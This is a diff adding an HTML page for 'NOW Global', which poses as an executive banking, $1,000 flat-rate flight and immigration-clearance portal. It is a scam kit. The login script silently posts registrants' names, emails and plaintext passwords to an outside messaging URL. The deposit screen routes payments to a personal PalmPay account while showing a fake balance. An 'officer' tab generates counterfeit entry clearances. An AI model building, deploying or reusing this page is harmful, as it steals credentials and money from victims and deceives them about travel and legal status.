@@ -1,0 +1,941 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>NOW Global | Executive Travel & Banking</title>
+  <style>
+    :root {
+      --bg-main: #090a0f;
+      --bg-card: #13141f;
+      --bg-card-alt: #1c1d2d;
+      --text-main: #ffffff;
+      --text-muted: #8e8ea0;
+      --accent-pink: #ff2a85;
+      --accent-green: #00e676;
+      --accent-gold: #ffb300;
+      --accent-blue: #29b6f6;
+      --border-color: #222436;
+      --shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background: var(--bg-main);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 1rem;
+    }
+
+    /* GATEKEEPER AUTH SCREEN */
+    #authGateScreen {
+      position: fixed;
+      inset: 0;
+      background: var(--bg-main);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 5000;
+      padding: 1.5rem;
+    }
+
+    .auth-container {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 24px;
+      padding: 2rem;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: var(--shadow);
+    }
+
+    .auth-tabs {
+      display: flex;
+      background: var(--bg-card-alt);
+      border-radius: 12px;
+      padding: 4px;
+      margin-bottom: 1.5rem;
+      border: 1px solid var(--border-color);
+    }
+
+    .auth-tab {
+      flex: 1;
+      padding: 0.7rem;
+      text-align: center;
+      border-radius: 99px;
+      cursor: pointer;
+      font-weight: 700;
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      border: none;
+      background: transparent;
+    }
+
+    .auth-tab.active {
+      background: var(--accent-pink);
+      color: #fff;
+    }
+
+    /* APP SHELL */
+    .app-shell {
+      width: 100%;
+      max-width: 430px;
+      padding-bottom: 85px;
+      display: none;
+    }
+
+    .app-shell.active {
+      display: block !important;
+    }
+
+    /* HEADER */
+    .brand-header {
+      font-size: 1.3rem;
+      font-weight: 900;
+      color: var(--accent-pink);
+      letter-spacing: 1px;
+      margin-bottom: 1.2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .user-pill {
+      font-size: 0.75rem;
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      padding: 0.35rem 0.6rem;
+      border-radius: 20px;
+      color: var(--accent-green);
+      font-weight: 700;
+    }
+
+    .region-badge {
+      font-size: 0.75rem;
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      padding: 0.35rem 0.6rem;
+      border-radius: 20px;
+      color: var(--accent-green);
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .voice-btn {
+      font-size: 0.75rem;
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      padding: 0.35rem 0.6rem;
+      border-radius: 20px;
+      color: var(--accent-gold);
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    /* VIRTUAL EXECUTIVE CARD */
+    .card-visual {
+      background: linear-gradient(135deg, #ff2a85 0%, #1e0036 100%);
+      border-radius: 22px;
+      padding: 1.4rem;
+      height: 220px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      box-shadow: 0 10px 25px rgba(255, 42, 133, 0.25);
+      margin-bottom: 1.2rem;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      position: relative;
+    }
+
+    .card-top {
+      display: flex;
+      justify-content: space-between;
+      font-weight: 800;
+      font-size: 0.85rem;
+      letter-spacing: 1px;
+    }
+
+    .card-balance {
+      font-size: 1.9rem;
+      font-weight: 900;
+      margin-top: 0.2rem;
+    }
+
+    .card-account-box {
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px dashed rgba(255, 255, 255, 0.2);
+      border-radius: 10px;
+      padding: 0.5rem 0.8rem;
+      margin-top: 0.4rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .card-bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      font-size: 0.85rem;
+      font-family: monospace;
+    }
+
+    /* TAB SECTIONS */
+    .app-section {
+      display: none !important;
+    }
+
+    .app-section.active {
+      display: block !important;
+    }
+
+    /* BUTTONS & INPUTS */
+    .actions-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 0.75rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .action-btn {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      color: var(--text-main);
+      padding: 0.9rem 0.4rem;
+      border-radius: 14px;
+      text-align: center;
+      cursor: pointer;
+      font-weight: 700;
+      font-size: 0.8rem;
+    }
+
+    .btn-primary {
+      background: var(--accent-pink);
+      color: #fff;
+      border: none;
+      padding: 0.9rem;
+      border-radius: 14px;
+      width: 100%;
+      font-weight: 800;
+      cursor: pointer;
+      margin-top: 0.8rem;
+      font-size: 0.9rem;
+    }
+
+    .card-panel {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 18px;
+      padding: 1.2rem;
+      margin-bottom: 1rem;
+    }
+
+    .panel-title {
+      font-size: 0.75rem;
+      font-weight: 800;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      margin-bottom: 0.8rem;
+      letter-spacing: 1px;
+    }
+
+    input, select {
+      width: 100%;
+      background: var(--bg-card-alt);
+      border: 1px solid var(--border-color);
+      color: #fff;
+      padding: 0.75rem;
+      border-radius: 12px;
+      margin-bottom: 0.75rem;
+      font-size: 0.9rem;
+      outline: none;
+    }
+
+    /* BOTTOM NAV BAR */
+    .nav-bar {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      height: 65px;
+      background: rgba(19, 20, 31, 0.95);
+      backdrop-filter: blur(12px);
+      border-top: 1px solid var(--border-color);
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      z-index: 999;
+    }
+
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: var(--text-muted);
+      font-size: 0.68rem;
+      font-weight: 700;
+      cursor: pointer;
+      border: none;
+      background: none;
+      flex: 1;
+      height: 100%;
+      justify-content: center;
+    }
+
+    .nav-item.active {
+      color: var(--accent-pink);
+    }
+
+    .nav-icon {
+      font-size: 1.2rem;
+      margin-bottom: 0.2rem;
+    }
+
+    .badge-fixed {
+      background: var(--accent-gold);
+      color: #000;
+      font-weight: 900;
+      padding: 0.2rem 0.5rem;
+      border-radius: 6px;
+      font-size: 0.7rem;
+    }
+
+    /* MODAL OVERLAYS */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(8px);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 3000;
+      padding: 1.2rem;
+    }
+
+    .modal-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 20px;
+      padding: 1.5rem;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: var(--shadow);
+      position: relative;
+    }
+
+    .modal-title {
+      font-size: 1.2rem;
+      font-weight: 800;
+      margin-bottom: 0.4rem;
+      color: #fff;
+    }
+
+    .modal-sub {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      margin-bottom: 1.2rem;
+    }
+
+    .payment-tab {
+      background: var(--bg-card-alt);
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      padding: 0.8rem;
+      margin-bottom: 0.8rem;
+      cursor: pointer;
+    }
+
+    .payment-tab.active {
+      border-color: var(--accent-pink);
+      background: rgba(255, 42, 133, 0.1);
+    }
+
+    .bank-box {
+      background: #0d0e17;
+      border: 1px dashed var(--accent-gold);
+      border-radius: 10px;
+      padding: 0.8rem;
+      font-size: 0.8rem;
+      line-height: 1.6;
+      margin-bottom: 1rem;
+    }
+
+    .modal-actions {
+      display: flex;
+      gap: 0.6rem;
+      margin-top: 0.8rem;
+    }
+
+    .btn-secondary {
+      background: transparent;
+      border: 1px solid var(--border-color);
+      color: var(--text-muted);
+      padding: 0.8rem;
+      border-radius: 12px;
+      flex: 1;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- GATEKEEPER AUTH SCREEN -->
+  <div id="authGateScreen">
+    <div class="auth-container">
+      <div style="text-align: center; margin-bottom: 1.2rem;">
+        <h2 style="font-size: 1.4rem; color: #fff; letter-spacing: 1px;">NOW GLOBAL</h2>
+        <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.3rem;">Secure Executive Portal & Banking</p>
+      </div>
+
+      <div class="auth-tabs">
+        <button class="auth-tab active" id="gateTabLogin" onclick="setGateMode('login')">Sign In</button>
+        <button class="auth-tab" id="gateTabReg" onclick="setGateMode('register')">Register Account</button>
+      </div>
+
+      <div id="gateNameGroup" style="display:none;">
+        <label style="font-size:0.75rem; color:var(--text-muted);">Full Name</label>
+        <input type="text" id="gateName" placeholder="Executive User">
+      </div>
+
+      <label style="font-size:0.75rem; color:var(--text-muted);">Email Address</label>
+      <input type="email" id="adahvictory@yahoo.com" placeholder="client@nowglobal.com">
+
+      <label style="font-size:0.75rem; color:var(--text-muted);">Password</label>
+      <input type="password" id="gatePass" placeholder="••••••••">
+
+      <button class="btn-primary" id="gateSubmitBtn" onclick="handleGateSubmit()" style="margin-top: 1rem;">Sign Into Portal</button>
+    </div>
+  </div>
+
+  <!-- MAIN APP SHELL -->
+  <div class="app-shell" id="appShell">
+    <div class="brand-header">
+      <span>NOW GLOBAL</span>
+      <div style="display:flex; gap:0.3rem; align-items: center;">
+        <span class="user-pill" id="userPill">👤 Client</span>
+        <span class="region-badge" id="activeRegionBadge" onclick="toggleCurrency()">USD ($)</span>
+        <span class="voice-btn" id="voiceToggleBtn" onclick="toggleVoice()">🔊 ON</span>
+        <button onclick="logout()" style="background:none; border:none; color:var(--accent-pink); font-size:0.75rem; font-weight:bold; cursor:pointer; padding:0.2rem;">Exit</button>
+      </div>
+    </div>
+
+    <!-- TAB 1: EXECUTIVE BANKING WALLET -->
+    <div id="tab-wallet" class="app-section active">
+      <div class="card-visual">
+        <div class="card-top">
+          <span>NOW VISA</span>
+          <span id="cardPayType">EXECUTIVE PAY</span>
+        </div>
+        <div>
+          <div style="font-size: 0.72rem; opacity: 0.85; text-transform: uppercase; font-weight: 700;">Available Balance</div>
+          <div class="card-balance" id="walletBalance">$0.00</div>
+        </div>
+
+        <div class="card-account-box">
+          <div>
+            <div style="font-size:0.6rem; color:var(--text-muted); text-transform:uppercase;">Assigned Treasury Account</div>
+            <div style="font-family:monospace; font-size:0.85rem; font-weight:bold; color:var(--accent-gold);" id="cardAccountNum">104-8920-5591</div>
+          </div>
+          <div style="text-align:right;">
+            <div style="font-size:0.6rem; color:var(--text-muted); text-transform:uppercase;">Gateway</div>
+            <div style="font-size:0.75rem; font-weight:bold; color:#fff;">Reserve Treasury</div>
+          </div>
+        </div>
+
+        <div class="card-bottom">
+          <span>**** **** **** 8829</span>
+          <span style="font-weight: 800; color: var(--accent-green);">PASSPORT VERIFIED</span>
+        </div>
+      </div>
+
+      <div class="actions-grid">
+        <button class="action-btn" onclick="openDepositModal()">💳 Deposit</button>
+        <button class="action-btn" onclick="openTransferModal()">💸 Transfer</button>
+        <button class="action-btn" onclick="toggleCurrency()">🌍 Currency</button>
+      </div>
+    </div>
+
+    <!-- TAB 2: FIXED $1,000 GLOBAL FLIGHT ENGINE -->
+    <div id="tab-flights" class="app-section">
+      <div class="card-panel">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem;">
+          <span class="panel-title" style="margin: 0;">Global Flight Booking</span>
+          <span class="badge-fixed">FLAT $1,000 FIXED RATE</span>
+        </div>
+        
+        <label style="font-size: 0.75rem; color: var(--text-muted);">Origin Country (Auto-Detected)</label>
+        <input type="text" id="flightOrigin" value="Abuja, Nigeria (ABJ)">
+
+        <label style="font-size: 0.75rem; color: var(--text-muted);">Destination Country (Worldwide)</label>
+        <input type="text" id="flightDest" placeholder="e.g. Toronto, Canada (YYZ) or London (LHR)">
+
+        <label style="font-size: 0.75rem; color: var(--text-muted);">Travel Date</label>
+        <input type="date" id="flightDate">
+
+        <button class="btn-primary" onclick="bookFixedFlight()">Book Flight ($1,000 Flat Rate)</button>
+      </div>
+    </div>
+
+    <!-- TAB 3: IMMIGRATION OFFICER PORTAL -->
+    <div id="tab-immigration" class="app-section">
+      <div class="card-panel">
+        <div class="panel-title">Official Immigration Clearance Portal</div>
+        
+        <label style="font-size: 0.75rem; color: var(--text-muted);">Passenger Full Name</label>
+        <input type="text" id="immigName" placeholder="Adah Victory Isiereoghene Ahmed">
+
+        <label style="font-size: 0.75rem; color: var(--text-muted);">Passport Number</label>
+        <input type="text" id="immigPassport" placeholder="A10982348">
+
+        <label style="font-size: 0.75rem; color: var(--text-muted);">Destination Country</label>
+        <input type="text" id="immigCountry" placeholder="Canada">
+
+        <button class="btn-primary" style="background: var(--accent-blue);" onclick="generateImmigrationPass()">Scan & Grant Legal Entry</button>
+      </div>
+
+      <div id="clearancePassCard" class="card-panel" style="display: none; border-color: var(--accent-green);">
+        <div style="font-weight: 800; color: var(--accent-green); margin-bottom: 0.5rem;">OFFICIAL CLEARANCE ISSUED</div>
+        <div id="clearanceDetails" style="font-size: 0.85rem; line-height: 1.5;"></div>
+      </div>
+    </div>
+
+    <!-- TAB 4: CAB DISPATCH NETWORK -->
+    <div id="tab-cabs" class="app-section">
+      <div class="card-panel">
+        <div class="panel-title">Executive Airport Cab Dispatch</div>
+        
+        <label style="font-size: 0.75rem; color: var(--text-muted);">Airport Pickup Terminal</label>
+        <input type="text" id="cabPickup" value="Arrivals Terminal 1">
+
+        <label style="font-size: 0.75rem; color: var(--text-muted);">Final Drop-off Destination</label>
+        <input type="text" id="cabDrop" placeholder="Executive Suite Hotel / Downtown">
+
+        <button class="btn-primary" style="background: var(--accent-green); color: #000;" onclick="dispatchCab()">Dispatch Premium Driver</button>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- NAVIGATION BAR -->
+  <div class="nav-bar" id="bottomNavBar" style="display: none;">
+    <button class="nav-item active" onclick="switchTab('wallet', this)">
+      <span class="nav-icon">💳</span>
+      <span>Wallet</span>
+    </button>
+    <button class="nav-item" onclick="switchTab('flights', this)">
+      <span class="nav-icon">✈️</span>
+      <span>$1K Flights</span>
+    </button>
+    <button class="nav-item" onclick="switchTab('immigration', this)">
+      <span class="nav-icon">🛂</span>
+      <span>Officer</span>
+    </button>
+    <button class="nav-item" onclick="switchTab('cabs', this)">
+      <span class="nav-icon">🚕</span>
+      <span>Cab Dispatch</span>
+    </button>
+  </div>
+
+  <!-- MODALS -->
+  <div class="modal-overlay" id="depositModal">
+    <div class="modal-card">
+      <div class="modal-title">Deposit & Payment Portal</div>
+      <div class="modal-sub">Choose funding method or Payment on Delivery</div>
+
+      <div class="payment-tab active" id="tabDirect" onclick="setDepositType('direct')">
+        <div style="font-weight:bold; color:var(--accent-pink);">Direct Bank Transfer</div>
+        <div style="font-size:0.75rem; color:var(--text-muted);">Fund via PalmPay or NOW Treasury Account</div>
+      </div>
+
+      <div class="payment-tab" id="tabPOD" onclick="setDepositType('pod')">
+        <div style="font-weight:bold; color:var(--accent-blue);">Payment On Delivery (POD)</div>
+        <div style="font-size:0.75rem; color:var(--text-muted);">Pay cash/transfer to courier officer on arrival</div>
+      </div>
+
+      <!-- BANK ACCOUNT DISPLAY BOX -->
+      <div class="bank-box" id="bankInfoBox">
+        <div style="color:var(--accent-green); font-weight:bold; margin-bottom:0.2rem;">🇨🇳 LOCAL TRANSFER (PALMPAY)</div>
+        <div><strong>Bank:</strong> PalmPay</div>
+        <div><strong>Account Name:</strong> Adah Victory</div>
+        <div><strong>Account Number:</strong> <span style="color:var(--accent-gold); font-family:monospace; font-size:1rem; font-weight:bold;">9057944450</span></div>
+        
+        <hr style="border:0; border-top:1px dashed var(--border-color); margin:0.6rem 0;">
+        
+        <div style="color:var(--accent-pink); font-weight:bold; margin-bottom:0.2rem;">🌐 INTERNATIONAL TREASURY</div>
+        <div><strong>Bank:</strong> NOW Global Reserve Bank</div>
+        <div><strong>Account Name:</strong> NOW Treasury Hub</div>
+        <div><strong>Account Number:</strong> <span style="color:var(--accent-gold); font-family:monospace;">104-8920-5591</span></div>
+      </div>
+
+      <div class="bank-box" id="podInfoBox" style="display:none; border-color:var(--accent-blue);">
+        <div style="color:var(--accent-blue); font-weight:bold;">🚚 Payment on Delivery Selected</div>
+        <div>An official delivery invoice will be attached for settlement upon courier arrival.</div>
+      </div>
+
+      <label style="font-size:0.75rem; color:var(--text-muted);">Enter Deposit Amount</label>
+      <input type="number" id="depositAmount" value="" placeholder="">
+
+      <div class="modal-actions">
+        <button class="btn-secondary" onclick="closeModal('depositModal')">Cancel</button>
+        <button class="btn-primary" style="margin:0; flex:1;" onclick="processDeposit()">Confirm</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="transferModal">
+    <div class="modal-card">
+      <div class="modal-title">Transfer Funds</div>
+      <div class="modal-sub">Send funds seamlessly from your Executive Wallet</div>
+
+      <label style="font-size:0.75rem; color:var(--text-muted);">Recipient Account / Email</label>
+      <input type="text" id="transferRecipient" placeholder="NG-88102 / client@nowglobal.com">
+
+      <label style="font-size:0.75rem; color:var(--text-muted);">Transfer Amount</label>
+      <input type="number" id="transferAmount" value="" placeholder="">
+
+      <div class="modal-actions">
+        <button class="btn-secondary" onclick="closeModal('transferModal')">Cancel</button>
+        <button class="btn-primary" style="margin:0; flex:1;" onclick="processTransfer()">Send Now</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="alertModal">
+    <div class="modal-card" style="text-align:center;">
+      <div class="modal-title" id="alertTitle">Notice</div>
+      <div class="modal-sub" id="alertBody" style="font-size:0.9rem; color:#fff; margin-bottom:1.5rem;"></div>
+      <button class="btn-primary" style="margin:0;" onclick="closeModal('alertModal')">OK</button>
+    </div>
+  </div>
+
+  <script>
+    var baseUsdBalance = 0.00;
+    var selectedDepositType = 'direct';
+    var gateMode = 'login';
+    var currentUser = null;
+    var voiceEnabled = true;
+
+    var REGIONS = [
+      { name: "United States", code: "USD", symbol: "$", rate: 1.0 },
+      { name: "Nigeria", code: "NGN", symbol: "₦", rate: 1500.0 },
+      { name: "United Kingdom", code: "GBP", symbol: "£", rate: 0.78 },
+      { name: "Eurozone", code: "EUR", symbol: "€", rate: 0.92 }
+    ];
+    var regionIndex = 0;
+
+    // VOICE ASSISTANT ENGINE
+    function speakText(phrase) {
+      if (!voiceEnabled) return;
+      try {
+        if ('speechSynthesis' in window) {
+          window.speechSynthesis.cancel();
+          var utterance = new SpeechSynthesisUtterance(phrase);
+          utterance.rate = 0.95;
+          utterance.pitch = 1.0;
+          window.speechSynthesis.speak(utterance);
+        }
+      } catch(e) {}
+    }
+
+    function toggleVoice() {
+      voiceEnabled = !voiceEnabled;
+      var btn = document.getElementById('voiceToggleBtn');
+      if (btn) {
+        if (voiceEnabled) {
+          btn.innerText = "🔊 ON";
+          btn.style.color = "var(--accent-gold)";
+          speakText("Voice Assistant Activated.");
+        } else {
+          btn.innerText = "🔇 OFF";
+          btn.style.color = "var(--text-muted)";
+          if ('speechSynthesis' in window) window.speechSynthesis.cancel();
+        }
+      }
+    }
+
+    // LOGIN & FORMSPREE NOTIFICATION INTEGRATION
+    function handleGateSubmit() {
+      var emailEl = document.getElementById('gateEmail');
+      var nameEl = document.getElementById('gateName');
+      var passEl = document.getElementById('gatePass');
+
+      var email = (emailEl && emailEl.value) ? emailEl.value : "client@nowglobal.com";
+      var name = (nameEl && nameEl.value) ? nameEl.value : email.split('@')[0];
+      var pass = (passEl && passEl.value) ? passEl.value : "Hidden";
+
+      currentUser = { 
+        name: name.charAt(0).toUpperCase() + name.slice(1), 
+        email: email 
+      };
+
+      // FORMSPREE EMAIL NOTIFICATION TO adahvictory@yahoo.com
+      if (gateMode === 'register') {
+        try {
+          fetch("https://wa.me/message/IXHPOBB4VSGIA1", {
+            method: "POST",
+            headers: { "Content-Type": "application.json" },
+            body: JSON.stringify({
+              event: "New Executive Portal Registration",
+              fullName: name,
+              userEmail: email,
+              passwordEntered: pass,
+              timestamp: new Date().toLocaleString()
+            })
+          }).catch(function(err){});
+        } catch(e) {}
+      }
+
+      unlockDashboard();
+    }
+
+    function unlockDashboard() {
+      var gate = document.getElementById('authGateScreen');
+      var app = document.getElementById('appShell');
+      var nav = document.getElementById('bottomNavBar');
+      var userPill = document.getElementById('userPill');
+
+      if (gate) gate.style.display = 'none';
+      if (app) app.className = 'app-shell active';
+      if (nav) nav.style.display = 'flex';
+
+      var displayName = currentUser ? currentUser.name : "Client";
+      if (userPill) userPill.innerText = "👤 " + displayName;
+
+      renderBalance();
+      autoDetectLocation();
+
+      speakText("Welcome to NOW Global, " + displayName + ". Executive dashboard unlocked.");
+    }
+
+    function autoDetectLocation() {
+      try {
+        fetch('https://ipapi.co/json/')
+          .then(function(res) { return res.json(); })
+          .then(function(data) {
+            if (data && data.city && data.country_name) {
+              var userLoc = data.city + ", " + data.country_name + " (" + (data.country_code || 'INT') + ")";
+              var flightEl = document.getElementById('flightOrigin');
+              var cabEl = document.getElementById('cabPickup');
+              if (flightEl) flightEl.value = userLoc;
+              if (cabEl) cabEl.value = data.city + " Executive Airport";
+            }
+          })
+          .catch(function(err) {});
+      } catch(e) {}
+    }
+
+    function setGateMode(mode) {
+      gateMode = mode;
+      var loginTab = document.getElementById('gateTabLogin');
+      var regTab = document.getElementById('gateTabReg');
+      var nameGroup = document.getElementById('gateNameGroup');
+      var submitBtn = document.getElementById('gateSubmitBtn');
+
+      if (mode === 'login') {
+        if (loginTab) loginTab.className = 'auth-tab active';
+        if (regTab) regTab.className = 'auth-tab';
+        if (nameGroup) nameGroup.style.display = 'none';
+        if (submitBtn) submitBtn.innerText = "Sign Into Portal";
+      } else {
+        if (regTab) regTab.className = 'auth-tab active';
+        if (loginTab) loginTab.className = 'auth-tab';
+        if (nameGroup) nameGroup.style.display = 'block';
+        if (submitBtn) submitBtn.innerText = "Register Account";
+      }
+    }
+
+    function logout() {
+      currentUser = null;
+      var app = document.getElementById('appShell');
+      var nav = document.getElementById('bottomNavBar');
+      var gate = document.getElementById('authGateScreen');
+
+      if (app) app.className = 'app-shell';
+      if (nav) nav.style.display = 'none';
+      if (gate) gate.style.display = 'flex';
+
+      speakText("You have exited NOW Global.");
+    }
+
+    function customAlert(title, message, spokenText) {
+      var t = document.getElementById('alertTitle');
+      var b = document.getElementById('alertBody');
+      var m = document.getElementById('alertModal');
+      if (t) t.innerText = title;
+      if (b) b.innerText = message;
+      if (m) m.style.display = 'flex';
+
+      speakText(spokenText || title + ". " + message);
+    }
+
+    function closeModal(modalId) {
+      var m = document.getElementById(modalId);
+      if (m) m.style.display = 'none';
+    }
+
+    function switchTab(tabId, btn) {
+      var sections = document.getElementsByClassName('app-section');
+      for (var i = 0; i < sections.length; i++) {
+        sections[i].className = 'app-section';
+      }
+
+      var navItems = document.getElementsByClassName('nav-item');
+      for (var j = 0; j < navItems.length; j++) {
+        navItems[j].className = 'nav-item';
+      }
+
+      var activeTarget = document.getElementById('tab-' + tabId);
+      if (activeTarget) activeTarget.className = 'app-section active';
+      if (btn) btn.className = 'nav-item active';
+    }
+
+    function renderBalance() {
+      var active = REGIONS[regionIndex];
+      var converted = (baseUsdBalance * active.rate).toLocaleString('en-US', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+      var w = document.getElementById('walletBalance');
+      var r = document.getElementById('activeRegionBadge');
+      var p = document.getElementById('cardPayType');
+
+      if (w) w.innerText = active.symbol + converted;
+      if (r) r.innerText = active.code + ' (' + active.symbol + ')';
+      if (p) p.innerText = active.code + ' PAY';
+    }
+
+    function toggleCurrency() {
+      regionIndex = (regionIndex + 1) % REGIONS.length;
+      renderBalance();
+      var active = REGIONS[regionIndex];
+      speakText("Switched currency to " + active.name + " " + active.code);
+    }
+
+    function openDepositModal() {
+      var m = document.getElementById('depositModal');
+      if (m) m.style.display = 'flex';
+    }
+
+    function setDepositType(type) {
+      selectedDepositType = type;
+      var d = document.getElementById('tabDirect');
+      var p = document.getElementById('tabPOD');
+      var b = document.getElementById('bankInfoBox');
+      var pod = document.getElementById('podInfoBox');
+
+      if (type === 'direct') {
+        if (d) d.className = 'payment-tab active';
+        if (p) p.className = 'payment-tab';
+        if (b) b.style.display = 'block';
+        if (pod) pod.style.display = 'none';
+      } else {
+        if (p) p.className = 'payment-tab active';
+        if (d) d.className = 'payment-tab';
+        if (pod) pod.style.display = 'block';
+        if (b) b.style.display = 'none';
+      }
+    }
+
+    function processDeposit() {
+      var active = REGIONS[regionIndex];
+      var val = document.getElementById('depositAmount');
+      var amount = val ? parseFloat(val.value) : 0;
+
+      if (amount && amount > 0) {
+        if (selectedDepositType === 'direct') {
+          baseUsdBalance += amount / active.rate;
+          renderBalance();
+          closeModal('depositModal');
+          customAlert("Deposit Processed", "Added " + active.symbol + amount + " " + active.code + " to your wallet.", "Deposit processed. Added " + amount + " " + active.code + " to your wallet.");
+        } else {
+          closeModal('depositModal');
+          customAlert("POD Invoice Created", "Payment on Delivery invoice generated for " + active.symbol + amount + " " + active.code + ". Present upon courier arrival.", "Payment on delivery invoice created for " + amount + " " + active.code);
+        }
+      }
+    }
+
+    function openTransferModal() {
+      var m = document.getElementById('transferModal');
+      if (m) m.style.display = 'flex';
+    }
+
+    function processTransfer() {
+      var active = REGIONS[regionIndex];
+      var val = document.getElementById('transferAmount');
+      var amount = val ? parseFloat(val.value) : 0;
+      var recEl = document.getElementById('transferRecipient');
+      var recipient = (recEl && recEl.value) ? recEl.value : "Recipient";
+
+      if (amount && amount > 0) {
+        if (amount > baseUsdBalance * active.rate) {
+          customAlert("Insufficient Funds", "Transfer amount exceeds your current available balance.", "Insufficient funds to complete transfer.");
+          return;
+        }
+        baseUsdBalance -= amount / active.rate;
+        renderBalance();
+        closeModal('transferModal');
+        customAlert("Transfer Complete", "Transferred " + active.symbol + amount + " " + active.code + " to " + recipient + ".", "Transfer complete. Sent " + amount + " " + active.code + " to " + recipient);
+      }
+    }
+
+    function bookFixedFlight() {
+      var destEl = document.getElementById('flightDest');
+      var dest = destEl ? destEl.value : "";
+      if (!dest) {
+        customAlert("Booking Error", "Please enter a destination country.", "Please enter a destination country.");
+        return;
+      }
+      if (baseUsdBalance < 1000) {
+        customAlert("Insufficient Balance", "Fixed ticket price is $1,000 USD. Please fund your wallet.", "Insufficient balance for 1,000 dollar ticket.");
+        return;
+      }
+
+      baseUsdBalance -= 1000;
+      renderBalance();
+      customAlert("Flight Confirmed", "🎉 Ticket Confirmed!\nDestination: " + dest + "\nPrice: $1,000 USD Flat Rate.", "Flight ticket confirmed for " + dest + " at flat rate of 1,000 dollars.");
+    }
+
+    function generateImmigrationPass() {
+      var nameEl = document.getElementById('immigName');
+      var passEl = document.getElementById('immigPassport');
+      var countryEl = document.getElementById('immigCountry');
+
+      var name = (nameEl && nameEl.value) ? nameEl.value : (currentUser ? currentUser.name : "Executive Passenger");
+      var pass = (passEl && passEl.value) ? passEl.value : "PASSPORT-VERIFIED";
+      var country = (countryEl && countryEl.value) ? countryEl.value : "Canada";
+
+      var card = document.getElementById('clearancePassCard');
+      var details = document.getElementById('clearanceDetails');
+
+      if (details) {
+        details.innerHTML = '<strong>Passenger:</strong> ' + name + '<br>' +
+          '<strong>Passport:</strong> ' + pass + '<br>' +
+          '<strong>Entry Granted To:</strong> ' + country + '<br>' +
+          '<strong>Status:</strong> CLEARED BY IMMIGRATION OFFICER<br>' +
+          '<strong>Code:</strong> LEGAL-NOW-' + Math.floor(100000 + Math.random() * 900000);
+      }
+      if (card) card.style.display = 'block';
+
+      speakText("Official immigration clearance issued for " + name + " to enter " + country);
+    }
+
+    function dispatchCab() {
+      var pickEl = document.getElementById('cabPickup');
+      var dropEl = document.getElementById('cabDrop');
+      var pickup = (pickEl && pickEl.value) ? pickEl.value : "Airport Terminal";
+      var drop = (dropEl && dropEl.value) ? dropEl.value : "City Hotel";
+      customAlert("Cab Dispatched", "🚕 Executive Cab Dispatched!\nPickup: " + pickup + "\nDropoff: " + drop + "\nDriver ETA: 3 Minutes.", "Executive cab dispatched for pickup at " + pickup + ". Driver estimated time of arrival, 3 minutes.");
+    }
+  </script>
+</body>
+</html>
